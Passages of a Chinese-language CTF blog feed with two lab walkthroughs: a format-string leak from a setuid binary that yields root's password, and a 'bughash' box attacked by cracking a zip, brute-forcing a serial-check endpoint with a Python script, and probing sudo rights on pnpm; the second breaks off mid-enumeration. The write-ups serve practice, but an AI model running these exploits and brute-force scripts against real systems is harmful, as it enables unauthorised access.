-rwxr-xr-x  1 welcome welcome 16696 Jun 17 07:39 server
-rwsr-xr-x  1 root    root    17104 Jun 18 09:51 vuln
welcome@easyfmt:/opt$ strings vuln 
/lib64/ld-linux-x86-64.so.2
mgUa
setuid
exit
perror
puts
stdin
printf
fgets
read
malloc
open
__cxa_finalize
setgid
__libc_start_main
libc.so.6
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\A]A^A_
/root/pass.txt
open
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
;*3$'
GCC: (Debian 10.2.1-6) 10.2.1 20210110
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
vuln.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
puts@GLIBC_2.2.5
stdin@GLIBC_2.2.5
_edata
printf@GLIBC_2.2.5
read@GLIBC_2.2.5
__libc_start_main@GLIBC_2.2.5
fgets@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
malloc@GLIBC_2.2.5
__bss_start
main
setgid@GLIBC_2.2.5
open@GLIBC_2.2.5
perror@GLIBC_2.2.5
exit@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@GLIBC_2.2.5
__cxa_finalize@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
```

拉过来，丢去ida

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
char s[68]; // [rsp+10h] [rbp-50h] BYREF
int fd; // [rsp+54h] [rbp-Ch]
void *buf; // [rsp+58h] [rbp-8h]
setuid(0);
setgid(0);
buf = malloc(0x18uLL);
fd = open('/root/pass.txt', 0);
if ( fd &lt; 0 )
{
perror('open');
exit(1);
}
puts('welcome:I have found mine.Then,where is your password?');
puts('root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.');
puts('welcome:Hahahaha,let's try:');
read(fd, buf, 0x18uLL);
fgets(s, 6, stdin);
printf(s);
return 0;
}
```

他直接把输入的字符串s当作printf的参数了

所以继续

```
welcome@easyfmt:/opt$ for i in $(seq 1 20);do
&gt; p='/opt/vuln'
&gt; pa='%$i\$s'
&gt; echo ''$pa''
&gt; echo '$pa' | $p
&gt; done
'%1$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
Segmentation fault
'%2$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
(null)
'%3$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:

'%4$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
%4$s

'%5$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
�f!�[U
'%6$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
,�^@�
'%7$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
Segmentation fault
'%8$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
Segmentation fault
'%9$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
Segmentation fault
'%10$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
'%11$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
H��H9�u�H�[]A\A]A^A_�'%12$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
(null)'%13$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
(null)'%14$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
AWL�=?+'%15$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
1�I��^H��H���PTL�
'%16$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
Segmentation fault
'%17$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
Y0u_4r3_S0_Gr34t!
'%18$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
AWL�=?+'%19$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
���y'%20$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
```

Y0u_4r3_S0_Gr34t!

```
welcome@easyfmt:/opt$ su -
Password: 
root@easyfmt:~# id
uid=0(root) gid=0(root) groups=0(root)
root@easyfmt:~# cat /root/root.txt 
flag{root-8a6fbe864f3154b901643b4943980d5e}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_easyfmt.html</guid><pubDate>Fri, 27 Jun 2025 09:29:32 +0000</pubDate></item><item><title>内部_bughash</title><link>https://7r1UMPHK.github.io/post/nei-bu-_bughash.html</link><description>再接再厉！

![image-20250608114424427](https://7r1umphk.github.io/image/20250608114424653.webp)

看靶机ip

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ sudo arp-scan -l
[sudo] password for kali: 
Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:f4:ef:6f       VMware, Inc.
192.168.205.131 08:00:27:1f:68:e6       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:ed:18:9e       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.180 seconds (117.43 hosts/sec). 4 responded
                                                          
```

探测服务

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nmap -p22,8080 -sC -sV 192.168.205.131
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-07 23:44 EDT
Nmap scan report for 192.168.205.131
Host is up (0.00079s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0 (protocol 2.0)
8080/tcp open  http    Node.js Express framework
|_http-title: \xE5\xA4\xA7\xE5\x82\xBB\xE5\xAD\x90\xE5\xBA\x8F\xE5\x88\x97\xE5\x8F\xB7\xE9\xAA\x8C\xE8\xAF\x81\xE7\xB3\xBB\xE7\xBB\x9F
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 1 disallowed entry 
|_zip2john 2026bak.zip &gt; ziphash
MAC Address: 08:00:27:1F:68:E6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.20 seconds
                                                                                 
```

看到8080有个2026bak.zip文件，拉下来

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ wget http://192.168.205.131:8080/2026bak.zip
--2025-06-07 23:46:14--  http://192.168.205.131:8080/2026bak.zip
Connecting to 192.168.205.131:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 676250 (660K) [application/zip]
Saving to: ‘2026bak.zip’

2026bak.zip                                  100%[=============================================================================================&gt;] 660.40K  --.-KB/s    in 0.03s   

2025-06-07 23:46:14 (24.1 MB/s) - ‘2026bak.zip’ saved [676250/676250]

                            
```

尝试打开

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ 7z x 2026bak.zip                      

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 676250 bytes (661 KiB)

Extracting archive: 2026bak.zip
--
Path = 2026bak.zip
Type = zip
Physical Size = 676250

    
Enter password (will not be echoed):
```

要密码，john爆破

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ zip2john 2026bak.zip &gt; hash
ver 2.0 2026bak.zip/2026bak/ is not encrypted, or stored with non-handled compression type
ver 2.0 2026bak.zip/2026bak/app.js PKZIP Encr: TS_chk, cmplen=550, decmplen=1189, crc=398AEF6F ts=58E6 cs=58e6 type=8
ver 2.0 2026bak.zip/2026bak/package.json PKZIP Encr: TS_chk, cmplen=188, decmplen=269, crc=B3FD1F4B ts=51B7 cs=51b7 type=8
ver 2.0 2026bak.zip/2026bak/pnpm-lock.yaml PKZIP Encr: TS_chk, cmplen=6576, decmplen=16896, crc=8A30424C ts=95C7 cs=95c7 type=8
ver 2.0 2026bak.zip/2026bak/public/ is not encrypted, or stored with non-handled compression type
ver 2.0 2026bak.zip/2026bak/public/css/ is not encrypted, or stored with non-handled compression type
ver 2.0 2026bak.zip/2026bak/public/css/all.min.css PKZIP Encr: TS_chk, cmplen=22371, decmplen=102025, crc=3F9C99C5 ts=908D cs=908d type=8
ver 2.0 2026bak.zip/2026bak/public/index.html PKZIP Encr: TS_chk, cmplen=2337, decmplen=8708, crc=BA472F2A ts=6A60 cs=6a60 type=8
ver 2.0 2026bak.zip/2026bak/public/js/ is not encrypted, or stored with non-handled compression type
ver 2.0 2026bak.zip/2026bak/public/js/index.js PKZIP Encr: TS_chk, cmplen=2140, decmplen=7773, crc=51B509C2 ts=50FC cs=50fc type=8
ver 2.0 2026bak.zip/2026bak/public/js/md5.min.js PKZIP Encr: TS_chk, cmplen=1587, decmplen=3770, crc=ABC5E899 ts=A254 cs=a254 type=8
ver 2.0 2026bak.zip/2026bak/public/js/seedrandom.min.js PKZIP Encr: TS_chk, cmplen=924, decmplen=1631, crc=A32D162A ts=9BE5 cs=9be5 type=8
ver 2.0 2026bak.zip/2026bak/public/robots.txt PKZIP Encr: TS_chk, cmplen=117, decmplen=122, crc=707883A9 ts=4D0C cs=4d0c type=8
ver 2.0 2026bak.zip/2026bak/public/webfonts/ is not encrypted, or stored with non-handled compression type
ver 2.0 2026bak.zip/2026bak/public/webfonts/fa-brands-400.ttf PKZIP Encr: TS_chk, cmplen=122902, decmplen=210792, crc=B603F717 ts=2BFC cs=2bfc type=8
ver 2.0 2026bak.zip/2026bak/public/webfonts/fa-brands-400.woff2 PKZIP Encr: TS_chk, cmplen=118720, decmplen=118680, crc=E0935466 ts=2BFC cs=2bfc type=8
ver 2.0 2026bak.zip/2026bak/public/webfonts/fa-regular-400.ttf PKZIP Encr: TS_chk, cmplen=26762, decmplen=68064, crc=8BAA11E2 ts=2BFC cs=2bfc type=8
ver 2.0 2026bak.zip/2026bak/public/webfonts/fa-regular-400.woff2 PKZIP Encr: TS_chk, cmplen=25494, decmplen=25472, crc=D76269F6 ts=2BFC cs=2bfc type=8
ver 2.0 2026bak.zip/2026bak/public/webfonts/fa-solid-900.ttf PKZIP Encr: TS_chk, cmplen=173643, decmplen=426112, crc=43F15403 ts=2BFC cs=2bfc type=8
ver 2.0 2026bak.zip/2026bak/public/webfonts/fa-solid-900.woff2 PKZIP Encr: TS_chk, cmplen=158282, decmplen=158220, crc=2F37E44A ts=2BFC cs=2bfc type=8
ver 2.0 2026bak.zip/2026bak/public/webfonts/fa-v4compatibility.ttf PKZIP Encr: TS_chk, cmplen=5048, decmplen=10836, crc=56DA8271 ts=2BFC cs=2bfc type=8
ver 2.0 2026bak.zip/2026bak/public/webfonts/fa-v4compatibility.woff2 PKZIP Encr: TS_chk, cmplen=4813, decmplen=4796, crc=D4BF5069 ts=2BFC cs=2bfc type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
No password hashes left to crack (see FAQ)
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ john --show hash                                     
2026bak.zip:123456789::2026bak.zip:2026bak/public/robots.txt, 2026bak/package.json, 2026bak/app.js, 2026bak/public/js/seedrandom.min.js, 2026bak/public/js/md5.min.js, 2026bak/public/js/index.js, 2026bak/public/index.html, 2026bak/public/webfonts/fa-v4compatibility.woff2:2026bak.zip

1 password hash cracked, 0 left
               
```

123456789的密码，解压

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ 7z x 2026bak.zip -p123456789          

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 676250 bytes (661 KiB)

Extracting archive: 2026bak.zip
--
Path = 2026bak.zip
Type = zip
Physical Size = 676250

    
Would you like to replace the existing file:
  Path:     ./2026bak/app.js
  Size:     0 bytes
  Modified: 2025-06-05 23:07:10
with the file from archive:
  Path:     2026bak/app.js
  Size:     1189 bytes (2 KiB)
  Modified: 2025-06-05 23:07:10
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? A

Everything is Ok       

Folders: 5
Files: 17
Size:       1165355
Compressed: 676250
                                           
```

看看目录结构

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cd 2026bak                   
                
┌──(kali㉿kali)-[/mnt/hgfs/gx/2026bak]
└─$ tree .    
.
├── app.js
├── package.json
├── pnpm-lock.yaml
└── public
    ├── css
    │   └── all.min.css
    ├── index.html
    ├── js
    │   ├── index.js
    │   ├── md5.min.js
    │   └── seedrandom.min.js
    ├── robots.txt
    └── webfonts
        ├── fa-brands-400.ttf
        ├── fa-brands-400.woff2
        ├── fa-regular-400.ttf
        ├── fa-regular-400.woff2
        ├── fa-solid-900.ttf
        ├── fa-solid-900.woff2
        ├── fa-v4compatibility.ttf
        └── fa-v4compatibility.woff2

5 directories, 17 files
                 
```

先看app.js

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/2026bak]
└─$ cat app.js                                
const express = require('express');
const path = require('path');

const app = express();
const port = process.env.PORT || 8080;

// 解析 JSON 请求体
app.use(express.json());

// 静态文件服务
app.use(express.static('public'));

// /checkSN 路由 (POST请求)
app.post('/checkSN', (req, res) =&gt; {
    // 从请求体中获取 SN 参数
    const sn = req.body.sn;

    if (sn) {
        if (sn === 'xxxxxxxxxxxxxxxxxxxxxxxxx') {
            res.json({
                code: 200,
                data: 'xxxxxx:XXXXX',
                msg: 'Success: Valid SN '
            });
        } else {
            res.json({
                code: 401,
                data: null,
                msg: 'Error: Invalid SN'
            });
        }
    } else {
        res.status(400).json({
            code: 400,
            data: null,
            msg: 'Missing sn parameter in request body'
        });
    }
});
app.use((req, res) =&gt; {
    res.status(404).json({
        code: 404,
        data: null,
        msg: '404 Not Found'
    });
});

app.listen(port, () =&gt; {
    console.log(`Server running at http://localhost:${port}`);
});                                                                                                                                                                                   
```

解析某些字符，然后以POST请求发送到/checkSN

继续看，看public/js/index.js

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/2026bak]
└─$ cat public/js/index.js 
document.addEventListener('DOMContentLoaded', function () {
    const snInput = document.getElementById('sn-input');
    const verifyBtn = document.getElementById('verify-btn');
    const responseText = document.getElementById('response-text');
    const statusIcon = document.getElementById('status-icon');
    function cleanInput(value) {
        return value.replace(/[^a-zA-Z0-9]/g, '').toUpperCase();
    }
    function formatSerialNumber(value) {
        let cleanValue = cleanInput(value);
        let formatted = '';
        for (let i = 0; i &lt; cleanValue.length; i++) {
            if (i &gt; 0 &amp;&amp; i % 5 === 0) {
                formatted += '-';
            }
            formatted += cleanValue[i];
        }
        return formatted;
    }
    snInput.addEventListener('input', function () {
        const startPos = snInput.selectionStart;
        const formattedValue = formatSerialNumber(snInput.value);
        snInput.value = formattedValue;
        let newPos = startPos;
        if (startPos === 6 || startPos === 12 || startPos === 18 || startPos === 24) {
            newPos = startPos + 1;
        }
        snInput.setSelectionRange(newPos, newPos);
    });
    snInput.addEventListener('keypress', function (e) {
        if (e.key === 'Enter') {
            verifySerialNumber();
        }
    });

    verifyBtn.addEventListener('click', verifySerialNumber);
    function verifySerialNumber() {
        const serialNumber = cleanInput(snInput.value);
        statusIcon.className = 'status-icon pending';
        statusIcon.innerHTML = '&lt;i class='fas fa-circle-notch fa-spin'&gt;&lt;/i&gt;';
        responseText.textContent = '验证中，请稍候...';
        if (serialNumber.length !== 25) {
            statusIcon.className = 'status-icon error';
            statusIcon.innerHTML = '&lt;i class='fas fa-exclamation-triangle'&gt;&lt;/i&gt;';
            responseText.textContent = '错误: 序列号长度不正确 (需要25个字符)';
            return;
        }
        let hashSN = CreatehashSN(snInput.value);
        // console.log('hashSN:', hashSN);

        setTimeout(function () {
            fetch('/checkSN', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ sn: hashSN })
            })
                .then(response =&gt; response.json())
                .then(data =&gt; {
                    console.log('checkSN response:', data);
                    if (data.code === 200) {
                        statusIcon.className = 'status-icon success';
                        statusIcon.innerHTML = '&lt;i class='fas fa-check-circle'&gt;&lt;/i&gt;';
                        responseText.innerHTML = `序列号 &lt;strong&gt;${snInput.value}&lt;/strong&gt; &lt;br&gt;验证成功！&lt;br&gt; ${data.data}`;
                    }
                    else {
                        statusIcon.className = 'status-icon error';
                        statusIcon.innerHTML = '&lt;i class='fas fa-times-circle'&gt;&lt;/i&gt;';
                        responseText.innerHTML = `序列号 &lt;strong&gt;${snInput.value}&lt;/strong&gt; 验证失败！&lt;br&gt;状态: 无效或已被使用`;
                    }
                });
        }, 300);
    }
});

// 随机数生成函数（使用Math.seedrandom）
function R(seed, min = 100, max = 200) {
    // const rng = new Math.seedrandom(seed);
    // // return Math.floor(rng() * (max - min + 1)) + min;
    // return Math.floor((max - min + 1)) + min;
    return seed + min + max;
}
function CreatehashSN(SN) {
    // if(SN.length!== 29)
    // {
    //     return '序列号长度不正确 (需要25个字符)';
    // }
    console.log('SN', SN);
    const VI = 'Jkdsfojweflk0024564555*';
    const KEY = '6K+35LiN6KaB5bCd6K+V5pq05Yqb56C06Kej77yM5LuU57uG55yL55yL5Yqg5a+G5rqQ5Luj56CB44CC';

    let a = [];
    let b = [];
    let e = [];
    let f = [];
    let z = [];

    // 处理SN字符串
    for (let i = 0; i &lt; SN.length; i++) {
        const charCode = SN.charCodeAt(i);

        if (i &gt;= 0 &amp;&amp; i &lt;= 4) {
            a.push(R(charCode));
            b.push(R(charCode));
            e.push(R(charCode));
            f.push(R(charCode));
            z.push(R(charCode));
        }
        if (i &gt;= 5 &amp;&amp; i &lt;= 9) {
            b.push(R(charCode));
            e.push(R(charCode));
            f.push(R(charCode));
            z.push(R(charCode));
        }
        if (i &gt;= 10 &amp;&amp; i &lt;= 14) {
            e.push(R(charCode));
            f.push(R(charCode));
            z.push(R(charCode));
        }
        if (i &gt;= 15 &amp;&amp; i &lt;= 19) {
            f.push(R(charCode));
            z.push(R(charCode));
        }
        if (i &gt;= 20 &amp;&amp; i &lt;= 24) {
            z.push(R(charCode));
        }
    }
    // console.log('a', a);
    // console.log('b', b);
    // console.log('e', e);
    // console.log('f', f);
    // console.log('z', z);
    // e = Math.max(f, g);
    if (a[0] &gt; a[2] || a[1] &gt; a[3]) {
        a[0] = Math.max(a[0], a[1], a[2], a[3], a[4]);
    } else {
        a[0] = Math.min(a[0], a[1], a[2], a[3], a[4]);
    }
    if (b[4] &gt; b[6]) {
        b[0] = Math.max(b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7]);
    } else {
        b[0] = Math.min(b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7]);
    }
    if (e[8] &gt; e[10] || e[9] &gt; e[11]) {
        e[0] = Math.max(e[0], e[1], e[2], e[3], e[4], e[5], e[6], e[7], e[8], e[9], e[10], e[11]);
    } else {
        e[0] = Math.min(e[0], e[1], e[2], e[3], e[4], e[5], e[6], e[7], e[8], e[9], e[10], e[11]);
    }
    if (f[0] &gt; f[10]) {
        f[0] = Math.max(f[0], f[1], f[2], f[3], f[4], f[5], f[6], f[7], f[8], f[9], f[10], f[11], f[12], f[13], f[14], f[15], f[16], f[17], f[18], f[19]);
    } else {
        f[0] = Math.min(f[0], f[1], f[2], f[3], f[4], f[5], f[6], f[7], f[8], f[9], f[10], f[11], f[12], f[13], f[14], f[15], f[16], f[17], f[18], f[19]);
    }
    if (z[15] &gt; z[17] || z[18] &gt; z[24]) {
        z[0] = Math.max(z[0], z[1], z[2], z[3], z[4], z[5], z[6], z[7], z[8], z[9], z[10], z[11], z[12], z[13], z[14], z[15], z[16], z[17], z[18], z[19], z[20], z[21], z[22], z[23], z[24]);
    } else {
        z[0] = Math.min(z[0], z[1], z[2], z[3], z[4], z[5], z[6], z[7], z[8], z[9], z[10], z[11], z[12], z[13], z[14], z[15], z[16], z[17], z[18], z[19], z[20], z[21], z[22], z[23], z[24]);
    }
    // console.log('a[0]', a[0]);
    // console.log('b[0]', b[0]);
    // console.log('e[0]', e[0]);
    // console.log('f[0]', f[0]);
    // console.log('z[0]', z[0]);
    let sum = 0;
    for (let i = 0; i &lt; a.length; i++) {
        sum += a[i]
    }
    // console.log('sum', sum);
    a[0] = (sum ^ a[0]) % 12;
    a[0] = KEY.charAt(a[0]);

    for (let i = 0; i &lt; b.length; i++) {
        sum += b[i]
    }
    // console.log('sum', sum);
    b[0] = (sum ^ b[0]) % 9;
    b[0] = KEY.charAt(b[0]);

    for (let i = 0; i &lt; e.length; i++) {
        sum += e[i]
    }
    // console.log('sum', sum);

    e[0] = (sum ^ e[0]) % 8;
    e[0] = KEY.charAt(e[0]);


    for (let i = 0; i &lt; f.length; i++) {
        sum += f[i]
    }
    // console.log('sum', sum);
    f[0] = (sum ^ f[0]) % 7;
    f[0] = KEY.charAt(f[0]);

    for (let i = 0; i &lt; z.length; i++) {
        sum += z[i]
    }
    // console.log('sum', sum);
    z[0] = (sum ^ z[0]) % 6;
    z[0] = VI.charAt(z[0]);

    // console.log('a[0]', a[0]);
    // console.log('b[0]', b[0]);
    // console.log('e[0]', e[0]);
    // console.log('f[0]', f[0]);
    // console.log('z[0]', z[0]);
    let hashSN = md5(a[0] + b[0] + e[0] + f[0] + z[0]);
    // console.log('hashSN', hashSN);
    return hashSN;
}
                                                               
```

他这hashSN有问题，是固定的量，爆破一下就好了

去网页抓个包

![image-20250608115935547](https://7r1umphk.github.io/image/20250608115936018.webp)

随便输点，抓包

```
POST /checkSN HTTP/1.1
Host: 192.168.205.131:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.205.131:8080/
Content-Type: application/json
Content-Length: 41
Origin: http://192.168.205.131:8080
Connection: keep-alive
Priority: u=4

{'sn':'4818799e57fe67c963b90a99f797beae'}
```

然后丢给AI吧，不想自己写

然后AI给的有点小问题，不显示每次爆破就算了，好像它爆破成功了也会继续爆破，自己改一下吧

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/2026bak]                                                                                                                                             
└─$ vim bp.py                                                                                                                                                               
┌──(kali㉿kali)-[/mnt/hgfs/gx/2026bak]
└─$ cat bp.py             
import hashlib
import json
import queue
import threading
import requests

KEY = '6K+35LiN6KaB5bCd6K+V5pq05Yqb56C06Kej77yM5LuU57uG55yL55yL5Yqg5a+G5rqQ5Luj56CB44CC'
VI = 'Jkdsfojweflk0024564555*'

def generate_all_hashes():
    hashes = []
    for i1 in range(12):
        s1 = KEY[i1]
        for i2 in range(9):
            s2 = KEY[i2]
            for i3 in range(8):
                s3 = KEY[i3]
                for i4 in range(7):
                    s4 = KEY[i4]
                    for i5 in range(6):
                        s5 = VI[i5]
                        s = s1 + s2 + s3 + s4 + s5
                        md5_hex = hashlib.md5(s.encode()).hexdigest()
                        hashes.append(md5_hex)
    return hashes

def worker(q, result, url):
    headers = {'Content-Type': 'application/json'}
    while not result and not q.empty():
        try:
            hash_sn = q.get_nowait()
            data = json.dumps({'sn': hash_sn})
            response = requests.post(url, headers=headers, data=data, timeout=5)
            if response.status_code == 200:
                try:
                    resp_data = response.json()
                    if resp_data.get('code') == 200:
                        result.append(hash_sn)
                        print(f'[+] Success! Found Valid SN: {hash_sn}')
                        return
                    else:
                        print(f'[-] Failed: {hash_sn} -&gt; {resp_data.get('msg', 'Unknown error')}')
                except json.JSONDecodeError:
                    print(f'[-] Failed (Invalid JSON): {hash_sn}')
            else:
                print(f'[-] Failed (HTTP {response.status_code}): {hash_sn}')
        except Exception as e:
            print(f'[!] Error with {hash_sn}: {str(e)}')
        finally:
            q.task_done()

if __name__ == '__main__':
    SERVER_URL = 'http://192.168.205.131:8080/checkSN'
    all_hashes = generate_all_hashes()
    print(f'Generated {len(all_hashes)} hashes. Starting爆破...')

    task_queue = queue.Queue()
    for h in all_hashes:
        task_queue.put(h)

    valid_hash = []
    num_threads = 8
    threads = []

    for _ in range(num_threads):
        t = threading.Thread(target=worker, args=(task_queue, valid_hash, SERVER_URL))
        t.daemon = True
        t.start()
        threads.append(t)

    task_queue.join()

    if valid_hash:
        print(f'[+] Valid hashSN found: {valid_hash[0]}')
    else:
        print('[-] No valid hashSN found.')
                                                                     
┌──(kali㉿kali)-[/mnt/hgfs/gx/2026bak]
└─$ python3 $_
Generated 36288 hashes. Starting爆破...
[-] Failed: 7e761b3333f90f1adb4b2bdb0192256f -&gt; Error: Invalid SN
省略
[+] Success! Found Valid SN: ee5a82db0f9bf1c1903821477e11c067
```

SN: ee5a82db0f9bf1c1903821477e11c067，我们试一下

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/2026bak]
└─$ curl -X POST -H 'Content-Type: application/json' -d '{'sn': 'ee5a82db0f9bf1c1903821477e11c067'}' http://192.168.205.131:8080/checkSN
{'code':200,'data':'welcome:DPKU9-8APJ9-8XZJ0-8XZ08-7H111','msg':'Success: Valid SN '}                                                                                      
```

登录

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/2026bak]
└─$ ssh welcome@192.168.205.131
The authenticity of host '192.168.205.131 (192.168.205.131)' can't be established.
ED25519 key fingerprint is SHA256:xJ90oWmr5sPR2afHz9etzSdtxINmLI+JvbwgV/iCsWY.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:16: [hashed name]
    ~/.ssh/known_hosts:17: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.131' (ED25519) to the list of known hosts.
welcome@192.168.205.131's password: 
=============================
Welcome!!!
QQ Group:660930334
=============================
lingdong:~$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
```

找信息

```
lingdong:~$ sudo -l
Matching Defaults entries for welcome on lingdong:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for welcome:
    Defaults!/usr/sbin/visudo env_keep+='SUDO_EDITOR EDITOR VISUAL'

User welcome may run the following commands on lingdong:
    (ALL : ALL) NOPASSWD: /root/.local/share/pnpm/global-bin/pm2
    (ALL : ALL) NOPASSWD: /usr/bin/pnpm
```

看有没有现成的

没找到，看看帮助文档

```
lingdong:~$ sudo /usr/bin/pnpm --help
Version 10.11.1 (compiled to binary; bundled Node.js v20.11.1)
Usage: pnpm [command] [flags]
       pnpm [ -h | --help | -v | --version ]

Manage your dependencies:
      add                  Installs a package and any packages that it depends on. By default, any new package is installed as a prod dependency
      import               Generates a pnpm-lock.yaml from an npm package-lock.json (or npm-shrinkwrap.json) file
   i, install              Install all dependencies for a project
  it, install-test         Runs a pnpm install followed immediately by a pnpm test
  ln, link                 Connect the local project to another one
      prune                Removes extraneous packages
  rb, rebuild              Rebuild a package
  rm, remove               Removes packages from node_modules and from the project's package.json
      unlink               Unlinks a package. Like yarn unlink but pnpm re-installs the dependency after removing the external link
  up, update               Updates packages to their latest version based on the specified range

Review your dependencies:
      audit                Checks for known security issues with the installed packages
      licenses             Check licenses in consumed packages
  ls, list                 Print all the versions of packages that are installed, as well as their dependencies, in a tree-structure
